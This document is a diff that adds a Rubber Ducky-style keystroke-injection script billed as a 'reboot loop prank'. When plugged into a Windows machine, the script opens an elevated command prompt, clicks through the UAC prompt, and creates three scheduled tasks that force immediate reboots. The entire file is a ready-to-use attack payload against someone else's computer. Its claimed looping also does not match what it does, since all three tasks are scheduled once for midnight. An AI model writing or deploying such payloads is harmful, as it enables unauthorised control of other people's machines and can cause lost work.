@@ -1,0 +1,25 @@
+REM ============================================
+REM Reboot Loop Prank
+REM FOR FRIENDLY PRANKS ONLY
+REM ============================================
+REM WARNING: This reboots the computer multiple times
+
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 800
+ALT y
+DELAY 500
+
+STRING schtasks /create /tn "RebootPrank" /tr "shutdown /r /t 0 /f" /sc once /st 00:00 /f
+ENTER
+STRING timeout /t 60
+ENTER
+STRING schtasks /create /tn "RebootPrank2" /tr "shutdown /r /t 0 /f" /sc once /st 00:00 /f
+ENTER
+STRING timeout /t 60
+ENTER
+STRING schtasks /create /tn "RebootPrank3" /tr "shutdown /r /t 0 /f" /sc once /st 00:00 /f
+ENTER
